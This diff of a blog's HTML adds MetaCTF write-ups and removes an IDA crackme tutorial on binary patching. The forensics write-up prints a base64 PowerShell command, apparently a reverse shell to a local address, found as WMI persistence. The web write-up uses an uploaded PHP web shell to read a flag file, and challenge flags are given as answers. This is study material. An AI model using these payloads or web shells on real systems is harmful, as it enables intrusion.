+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Dear Shinny Upatree,</span><br><span class="line"></span><br><span class="line">Hope you<span class="string">&#x27;re having a merry day! I&#x27;</span>m <span class="keyword">in</span> a bit of a sticky situation</span><br><span class="line">and could really use your <span class="built_in">help</span>.</span><br><span class="line"></span><br><span class="line">So, Sugarplum Mary made these amazing treats <span class="keyword">for</span> the office</span><br><span class="line">party, and, well, I couldn<span class="string">&#x27;t resist. I ended up eating all of them!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now there&#x27;</span>s nothing left <span class="keyword">for</span> the party, and I<span class="string">&#x27;m in a bit of a jam</span></span><br><span class="line"><span class="string">(not unlike the filled donuts haha). I need to sort this out before</span></span><br><span class="line"><span class="string">Sugarplum Mary or Santa find out, or the party&#x27;</span>s going to be a </span><br><span class="line">disaster.</span><br><span class="line"></span><br><span class="line">Do you have any ideas or tricks up your sleeve to <span class="built_in">help</span> me</span><br><span class="line">whip up some new treats <span class="keyword">in</span> <span class="keyword">time</span>? I know I can count on you to </span><br><span class="line">keep this between us.</span><br><span class="line"></span><br><span class="line">I encrypted this message with atbash, so hopefully my little</span><br><span class="line">secret is safe.</span><br><span class="line"></span><br><span class="line">Thanks a ton <span class="keyword">for</span> being such a great friend. I owe you one!</span><br><span class="line"></span><br><span class="line">Cheers,</span><br><span class="line">Bushy Evergreen</span><br><span class="line"></span><br><span class="line">P.S. That code you were asking about to unlock the development mode </span><br><span class="line"><span class="keyword">for</span> the Magical Infusion Machine, M2X24 is </span><br><span class="line">MetaCTF&#123;both_treats_and_messages_stolen&#125;, hope that helps!</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>This Christmas, my festive joy turned into frustration. Decorations vanished, garlands moved, and cookies mysteriously disappeared. Blocking the chimney seemed like the solution, but the intrusions didn’t stop. That’s when it hit me: the thief must have created a “backchimney” — a secret passage we can’t find.</p>
+<p>Can you uncover the mystery in the artifacts provided here and catch the culprit before they ruin Christmas?</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/davidpany/WMI_Forensics">https://github.com/davidpany/WMI_Forensics</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/Repository]</span><br><span class="line">└─# <span class="built_in">cd</span> WMI_Forensics                </span><br><span class="line">                                                                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/Repository/WMI_Forensics]</span><br><span class="line">└─# python2 CCM_RUA_Finder.py -i ../OBJECTS.DATA -o out.xls</span><br><span class="line">                100% complete...                                                                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/Repository/WMI_Forensics]</span><br><span class="line">└─# python2 PyWMIPersistenceFinder.py ../OBJECTS.DATA            </span><br><span class="line"></span><br><span class="line">    Enumerating FilterToConsumerBindings...</span><br><span class="line">    2 FilterToConsumerBinding(s) Found. Enumerating Filters and Consumers...</span><br><span class="line"></span><br><span class="line">    Bindings:</span><br><span class="line"></span><br><span class="line">        PowershellMemoryCapture-PowerShellProcessStarted</span><br><span class="line">            Consumer: </span><br><span class="line">                Consumer Type: CommandLineEventConsumer</span><br><span class="line">                Arguments:     powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIANAAwAC4AMQAiACwANAA5ADUAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAIgBNAGUAdABhAEMAVABGAHsAMQBfAGgANAB2ADMAXwBAAF8AYgA0AGMAawBjAGgAMQBtAG4AMwB5AF8ANABfAHkAMAB1AH0AIgAgACsAIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==</span><br><span class="line">                Consumer Name: PowershellMemoryCapture</span><br><span class="line"></span><br><span class="line">            Filter: </span><br><span class="line">                Filter name:  PowerShellProcessStarted</span><br><span class="line">                Filter Query: SELECT FileName, ProcessID FROM Win32_ModuleLoadTrace WHERE FileName LIKE <span class="string">&quot;%System.Management.Automation%.dll&quot;</span></span><br><span class="line"></span><br><span class="line">        SCM Event Log Consumer-SCM Event Log Filter</span><br><span class="line">                (Common binding based on consumer and filter names, possibly legitimate)</span><br><span class="line">            Consumer: NTEventLogEventConsumer ~ SCM Event Log Consumer ~ sid ~ Service Control Manager</span><br><span class="line"></span><br><span class="line">            Filter: </span><br><span class="line">                Filter name:  SCM Event Log Filter</span><br><span class="line">                Filter Query: <span class="keyword">select</span> * from MSFT_SCMEventLogEvent</span><br><span class="line"></span><br><span class="line">    Thanks <span class="keyword">for</span> using PyWMIPersistenceFinder! Please contact @DavidPany with questions, bugs, or suggestions.</span><br><span class="line"></span><br><span class="line">    Please review FireEye<span class="string">&#x27;s whitepaper for additional WMI persistence details:</span></span><br><span class="line"><span class="string">        https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf</span></span><br><span class="line"><span class="string">                                                                                                                                       </span></span><br></pre></td></tr></table></figure>
+
+<p>把base64解ㄌ</p>
+<p><img src="/img/metactff1.png" alt="metactff.png"></p>
+<p>flag在裡面</p>
+<blockquote>
+<p>MetaCTF{1_h4v3_@_b4ckch1mn3y_4_y0u}</p>
+</blockquote>
+<p>參考這個很有幫助 <a target="_blank" rel="noopener" href="https://www.hackthebox.com/blog/perseverance-biz-ctf-2022-forensics-writeup">https://www.hackthebox.com/blog/perseverance-biz-ctf-2022-forensics-writeup</a></p>
+<hr>
+<p>Santa wants to spread holiday cheer, but doesn’t want to rely on other websites for photo sharing. He’s building a new website to allow children to upload their holiday photos! Maybe check it out to make sure it’s secure…</p>
+<p>Download the source code for the website here.</p>
+<p>Your URL is <a target="_blank" rel="noopener" href="http://l5fqfkfbfkm8.chals.mctf.io/">http://l5fqfkfbfkm8.chals.mctf.io</a></p>
+<p><img src="/img/metactff2.png" alt="metactff.png"></p>
+<p>檢查拿到的程式</p>
+<p>在 <code>upload.php</code> 的代碼中，上傳的文件沒有進行嚴格的檢查和限制：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;metactff&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;alert alert-success mt-3&#x27;&gt;Your photo has been uploaded!&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;alert alert-danger mt-3&#x27;&gt;There was an error uploading your file.&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>缺乏文件類型檢查</strong>：<code>$_FILES[&quot;metactff&quot;][&quot;name&quot;]</code> 直接用於生成目標文件名，並未檢查文件是否真的是圖片（如 JPEG、PNG）。</li>
+<li><strong>缺乏 MIME 類型檢查</strong>：沒有驗證 <code>$_FILES[&quot;metactff&quot;][&quot;type&quot;]</code> 是否與圖片類型匹配。</li>
+<li><strong>缺乏內容檢查</strong>：沒有檢查文件的內容是否為合法圖片格式，而非惡意代碼。</li>
+</ul>
+<p>上傳的文件被存儲在 <code>metactffs/</code> 目錄中，該目錄允許執行 PHP 文件。</p>
+<ul>
+<li>Web 服務器的配置允許執行 <code>metactffs/</code> 目錄中的 PHP 文件，因此上傳的惡意文件（如 <code>exp.php</code>）可以被執行。</li>
+</ul>
+<p>透過原始碼知道他所有文件上傳到metactffs</p>
+<p>不知道flag位置沒問題，直接查找，因為上傳的exploit讓我們可以發動任意指令</p>
+<p><img src="/img/metactff3.png" alt="metactff.png"></p>
+<p><a target="_blank" rel="noopener" href="http://l5fqfkfbfkm8.chals.mctf.io/metactffs/exp.php?cmd=cat/var/www/html/flag.txt">http://l5fqfkfbfkm8.chals.mctf.io/metactffs/exp.php?cmd=cat /var/www/html/flag.txt</a></p>
+<p><img src="/img/metactff4.png" alt="metactff.png"></p>
+<blockquote>
+<p>GIF89aMetaCTF{ph3ar_d3s3rial1z3d_0bj3cts} MetaCTF{ph3ar_d3s3rial1z3d_0bj3cts}</p>
+</blockquote>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+  
     <article id="Lame-Lame" class="article article-type-Lame" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -4142,160 +4468,6 @@ z=2
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">double</span> v0,t,g,d;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;input v0,t,g&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cin&gt;&gt;v0&gt;&gt;t&gt;&gt;g;</span><br><span class="line">    d=v0*t+(g*t*t)/<span class="number">2</span>;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;d=&quot;</span>&lt;&lt;d;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p><strong>5.請分別輸入1個0到9的整數，並將它合併為1個整數</strong><br>&#x3D;&#x3D;例如:輸入1、2、3、4則輸出1234&#x3D;&#x3D;</p>
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    cin&gt;&gt;i;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;your input is:&quot;</span>&lt;&lt;i&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-  
-    <article id="post-Crackme" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2024/12/21/Crackme/" class="article-date">
-  	<time datetime="2024-12-21T12:32:07.079Z" itemprop="datePublished">2024-12-21</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/12/21/Crackme/">
-        IDA - Crack me1
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Crack-me"><a href="#Crack-me" class="headerlink" title="Crack me"></a>Crack me</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">remnux@remnux:~/Documents/crackme$ ./crackme1</span><br><span class="line">enter key:dwdwdwd</span><br><span class="line"></span><br><span class="line">sorry</span><br><span class="line"></span><br><span class="line">remnux@remnux:~/Documents/crackme$ ./crackme1</span><br><span class="line">enter key:2337</span><br><span class="line"></span><br><span class="line">congrats</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\ncongrats\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fail</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nsorry\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> key = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;enter key:&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(key == <span class="number">2337</span>) success();</span><br><span class="line">        <span class="keyword">else</span> fail();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;                                                                                               </span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/revcra1_Untitled.png" alt="Untitled"></p>
-<p><img src="/img/revcra1_Untitled_1.png" alt="Untitled"></p>
-<p>逐步完成這過程， <code>F2</code> 放置斷點</p>
-<p>或是Debugger &gt; Breakpoints &gt; Add breakpoint</p>
-<p><img src="/img/revcra1_Untitled_2.png" alt="Untitled"></p>
-<p>在執行debugger後，會看到terminal跳出enter key:</p>
-<p>先隨便輸入</p>
-<p><img src="/img/revcra1_Untitled_3.png" alt="Untitled"></p>
-<p>右側綠色箭頭會開始閃爍，如果輸入不是2337會走到右邊，並調用fail function</p>
-<ul>
-<li>2337-2337&#x3D;0才往左跑</li>
-</ul>
-<p><img src="/img/revcra1_Untitled_4.png" alt="Untitled"></p>
-<p>目前狀況是會往右走call fail function，想讓它變成call success</p>
-<p><img src="/img/revcra1_Untitled_5.png" alt="Untitled"></p>
-<p><img src="/img/revcra1_Untitled_6.png" alt="Untitled"></p>
-<p>改變jnz，因為預設是跑fail function</p>
-<ul>
-<li>Edit &gt; Patch program &gt;　Assemble…</li>
-<li>jnz → jz</li>
-</ul>
-<p><img src="/img/revcra1_Untitled_7.png" alt="Untitled"></p>
-<p><img src="/img/revcra1_Untitled_8.png" alt="Untitled"></p>
-<p>這邊順便談談 jmp &#x2F; jz &#x2F; jnz &#x2F; je &#x2F; jne 這些跳轉指令</p>
-<ul>
-<li>JMP：無條件跳轉。</li>
-<li>JE &#x2F; JZ：如果相等或者為零，則跳轉。</li>
-<li>JNE &#x2F; JNZ：如果不相等或者不為零，則跳轉。</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">            +------(<span class="keyword">if</span> A == B)------+</span><br><span class="line">            |                       |</span><br><span class="line">           JMP                     JMP</span><br><span class="line">            |                       |</span><br><span class="line">  +-----(<span class="keyword">if</span> C == D)------+          |</span><br><span class="line">  |         |            |          |</span><br><span class="line"> JE        JNE           JZ        JNZ</span><br><span class="line">  |         |            |          |</span><br><span class="line">(<span class="literal">true</span>)    (<span class="literal">true</span>)       (<span class="literal">true</span>)     (<span class="literal">true</span>)</span><br><span class="line">  |         |            |          |</span><br><span class="line"> ...       ...          ...        ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>再來按F8 步進，記得要在運行程式的狀況下才能進行這動作</p>
-<p><img src="/img/revcra1_Untitled_9.png" alt="Untitled"></p>
-<p>會看到他跳到了左側，按到call success function會看到跳出訊息</p>
-<p><img src="/img/revcra1_Untitled_10.png" alt="Untitled"></p>
-<p><img src="/img/revcra1_Untitled_11.png" alt="Untitled"></p>
-<p>按F9繼續執行</p>
-<p>建立文件備份</p>
-<p>Edit &gt;Patch program &gt;apply patch to input file…</p>
-<ul>
-<li>勾取 Create backup</li>
-<li>會生成.bak</li>
-</ul>
-<p><img src="/img/revcra1_Untitled_12.png" alt="Untitled"></p>
-<p>再次運行執行檔，會看到他已被修復</p>
-<ul>
-<li>隨便輸入就可以得到congrats</li>
-</ul>
-<p><img src="/img/revcra1_Untitled_13.png" alt="Untitled"></p>
-<hr>
-<p>另一種竄改執行的方式</p>
-<p>將前面的ida關閉時不保存任何檔案，並刪除除了.bak及c檔的所有檔案</p>
-<p>刪除.bak檔案的附檔名，重新開啟ida將檔案引入</p>
-<p>記得給予檔案執行權限，debug才不會出現權限錯誤</p>
-<p>這次換再跳轉前下斷點並運行debug</p>
-<p><img src="/img/revcra1_Untitled_14.png" alt="Untitled"></p>
-<p><img src="/img/revcra1_Untitled_15.png" alt="Untitled"></p>
-<p>執行流程依舊是eax - 921h &#x3D;0 才跳轉到success，可以透過修改暫存器的值，16進制的值</p>
-<p><img src="/img/revcra1_Untitled_16.png" alt="Untitled"></p>
-<p>→ 0x0000000000000000 → 0x0000000000000<strong>921</strong></p>
-<p>運行F8步進過去</p>
-<ul>
-<li><code>F8</code> 會直接運行到下個指令，不進入function</li>
-<li><code>F7</code> 會深入到function中一步步運行指令</li>
-</ul>
-<p><img src="/img/revcra1_Untitled_17.png" alt="Untitled"></p>
-<p>成功執行到success</p>
-<p><img src="/img/revcra1_Untitled_18.png" alt="Untitled"></p>
-<hr>
-<p>第三種方式 刪除指令本身執行</p>
-<p>需要計算需要再不進行任何操作的情況下替換多少位元組</p>
-<ul>
-<li>each nop &#x3D; 1</li>
-<li>byte, i.e. 0x90</li>
-</ul>
-<p>設定並查看位元組</p>
-<p>Option&gt;General</p>
-<p><img src="/img/revcra1_Untitled_19.png" alt="Untitled"></p>
-<p>mov eax後面跟著位址值，這位址占用三個位元組(8B 45 F4)</p>
-<p><img src="/img/revcra1_Untitled_20.png" alt="Untitled"></p>
-<p>暫時停用該區塊的指令執行，而不需要修改原始指令</p>
-<p>Edit&gt;Patch Program&gt;Change byte</p>
-<ul>
-<li>8B 45 F4 3D 21 09 00 00 75 0C B8 00 00 00 00 E8  -&gt; <strong>90 90 90</strong> 3D 21 09 00 00 75 0C B8 00 00 00 00 E8</li>
-</ul>
-<p><img src="/img/revcra1_Untitled_21.png" alt="Untitled"></p>
-<p>將指令由**<code>8B 45 F4</code><strong>改為</strong><code>90 90 90</code><strong>的目的是將原本的指令替換為</strong>NOP（No Operation）**指令，也就是空操作指令</p>
-<ul>
-<li>NOP指令不會對處理器的狀態或者暫存器的內容進行任何改變，它只是<strong>消耗處理器的時間，但不會有任何實際的作用</strong></li>
-<li>通過替換指令為NOP來忽略某些部分的執行，以方便測試或者分析程式的行為</li>
-<li>**<code>90</code><strong>是NOP指令的機器碼表示。所以將指令替換為三個</strong><code>90</code>**，就相當於執行了三次NOP，從而將原本的指令暫時禁用</li>
-</ul>
-<p><img src="/img/revcra1_Untitled_22.png" alt="Untitled"></p>
-<p>如果不希望這部分指令發生可以利用這方式</p>
-<ul>
-<li>位元數必須相同，不然可能蓋到其他指令</li>
-</ul>
 
       
     </div>
